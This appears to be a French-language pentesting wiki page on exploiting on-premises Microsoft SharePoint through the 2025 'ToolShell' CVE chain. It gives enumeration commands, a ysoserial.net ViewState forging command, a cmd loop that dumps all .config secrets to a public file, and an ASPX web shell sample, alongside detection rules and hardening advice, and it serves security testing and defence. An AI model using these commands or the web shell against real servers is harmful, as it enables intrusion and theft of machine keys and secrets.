# Microsoft SharePoint – Pentesting & Exploitation

{{#include ../../banners/hacktricks-training.md}}

> Microsoft SharePoint (sur site) est construit sur ASP.NET/IIS. La plupart de la surface d'attaque web classique (ViewState, Web.Config, web shells, etc.) est donc présente, mais SharePoint est également livré avec des centaines de pages ASPX propriétaires et de services web qui élargissent considérablement la surface d'attaque exposée. Cette page recueille des astuces pratiques pour énumérer, exploiter et persister dans les environnements SharePoint en mettant l'accent sur la chaîne d'exploitation 2025 divulguée par Unit42 (CVE-2025-49704/49706/53770/53771).

## 1. Quick enumeration
```
# favicon hash and keywords
curl -s https://<host>/_layouts/15/images/SharePointHome.png
curl -s https://<host>/_vti_bin/client.svc | file -  # returns WCF/XSI

# version leakage (often in JS)
curl -s https://<host>/_layouts/15/init.js | grep -i "spPageContextInfo"

# interesting standard paths
/_layouts/15/ToolPane.aspx               # vulnerable page used in 2025 exploit chain
/_vti_bin/Lists.asmx                     # legacy SOAP service
/_catalogs/masterpage/Forms/AllItems.aspx

# enumerate sites & site-collections (requires at least Anonymous)
python3 Office365-ADFSBrute/SharePointURLBrute.py -u https://<host>
```
## 2. Chaîne d'exploitation 2025 (a.k.a. “ToolShell”)

### 2.1 CVE-2025-49704 – Injection de code sur ToolPane.aspx

`/_layouts/15/ToolPane.aspx?PageView=…&DefaultWebPartId=<payload>` permet l'injection de code *Server-Side Include* arbitraire dans la page qui est ensuite compilée par ASP.NET. Un attaquant peut intégrer du C# qui exécute `Process.Start()` et déposer un ViewState malveillant.

### 2.2 CVE-2025-49706 – Contournement d'authentification incorrect

La même page fait confiance à l'en-tête **X-Forms_BaseUrl** pour déterminer le contexte du site. En le pointant vers `/_layouts/15/`, la MFA/SSO appliquée au site racine peut être contournée **sans authentification**.

### 2.3 CVE-2025-53770 – Désérialisation de ViewState non authentifiée → RCE

Une fois que l'attaquant contrôle un gadget dans `ToolPane.aspx`, il peut poster une valeur `__VIEWSTATE` **non signée** (ou uniquement MAC) qui déclenche la désérialisation .NET à l'intérieur de *w3wp.exe*, entraînant une exécution de code.

Si la signature est activée, volez la **ValidationKey/DecryptionKey** de n'importe quel `web.config` (voir 2.4) et falsifiez le payload avec *ysoserial.net* ou *ysodom*:
```
ysoserial.exe -g TypeConfuseDelegate -f Json.Net -o raw -c "cmd /c whoami" |
ViewStateGenerator.exe --validation-key <hex> --decryption-key <hex> -o payload.txt
```
Pour une explication approfondie sur l'abus de l'ASP.NET ViewState, lisez :
{{#ref}}
../../pentesting-web/deserialization/exploiting-__viewstate-parameter.md
{{#endref}}

### 2.4 CVE-2025-53771 – Traversée de chemin / Divulgation de web.config

L'envoi d'un paramètre `Source` conçu à `ToolPane.aspx` (par exemple `../../../../web.config`) renvoie le fichier ciblé, permettant la fuite de :

* `<machineKey validationKey="…" decryptionKey="…">`  ➜ forger les cookies ViewState / ASPXAUTH
* chaînes de connexion et secrets.

## 3. Recettes de post-exploitation observées dans la nature

### 3.1 Exfiltrer chaque fichier *.config* (variation-1)
```
cmd.exe /c for /R C:\inetpub\wwwroot %i in (*.config) do @type "%i" >> "C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\debug_dev.js"
```
Le fichier `debug_dev.js` résultant peut être téléchargé anonymement et contient **toutes** les configurations sensibles.

### 3.2 Déployer un shell web ASPX encodé en Base64 (variation-2)
```
powershell.exe -EncodedCommand <base64>
```
Exemple de charge utile décodée (raccourci) :
```csharp
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){
Response.Write(MachineKey.ValidationKey);
// echo secrets or invoke cmd
}
</script>
```
Écrit à :
```
C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\spinstall0.aspx
```
Le shell expose des points de terminaison pour **lire / faire pivoter les clés de machine** ce qui permet de forger des cookies ViewState et ASPXAUTH à travers la ferme.

### 3.3 Variante obfusquée (variation-3)

Même shell mais :
* déposé sous `...\15\TEMPLATE\LAYOUTS\`
* noms de variables réduits à des lettres uniques
* `Thread.Sleep(<ms>)` ajouté pour l'évasion de sandbox et le contournement AV basé sur le timing.

## 4. Idées de détection

| Télémétrie | Pourquoi c'est suspect |
|-----------|----------------------|
| `w3wp.exe → cmd.exe`             | Le processus de travail ne devrait que rarement lancer un shell  |
| `cmd.exe → powershell.exe -EncodedCommand` | Modèle classique de lolbin           |
| Événements de fichiers créant `debug_dev.js` ou `spinstall0.aspx` | IOCs directement de ToolShell |
| `ProcessCmdLine CONTIENT ToolPane.aspx` (logs ETW/Module) | Les PoCs publics invoquent cette page |

Exemple de règle XDR / Sysmon (pseudo-XQL) :
```
proc where parent_process_name="w3wp.exe" and process_name in ("cmd.exe","powershell.exe")
```
## 5. Durcissement & Atténuation

1. **Patch** – Les mises à jour de sécurité de juillet 2025 corrigent *tous* les quatre CVE.
2. **Faire tourner** chaque `<machineKey>` et les secrets `ViewState` après compromission.
3. Supprimer la permission d'écriture *LAYOUTS* des groupes `WSS_WPG` & `WSS_ADMIN_WPG`.
4. Bloquer l'accès externe à `/_layouts/15/ToolPane.aspx` au niveau du proxy/WAF.
5. Activer **ViewStateUserKey**, **MAC activé**, et *EventValidation* personnalisé.

## Astuces connexes

* IIS post-exploitation & abus de web.config :
{{#ref}}
../../network-services-pentesting/pentesting-web/iis-internet-information-services.md
{{#endref}}

## Références

- [Unit42 – Exploitation active des vulnérabilités de Microsoft SharePoint](https://unit42.paloaltonetworks.com/microsoft-sharepoint-cve-2025-49704-cve-2025-49706-cve-2025-53770/)
- [GitHub PoC – Chaîne d'exploitation ToolShell](https://github.com/real-or-not/ToolShell)
- [Avis de sécurité Microsoft – CVE-2025-49704 / 49706](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-49704)
- [Avis de sécurité Microsoft – CVE-2025-53770 / 53771](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-53770)

{{#include ../../banners/hacktricks-training.md}}
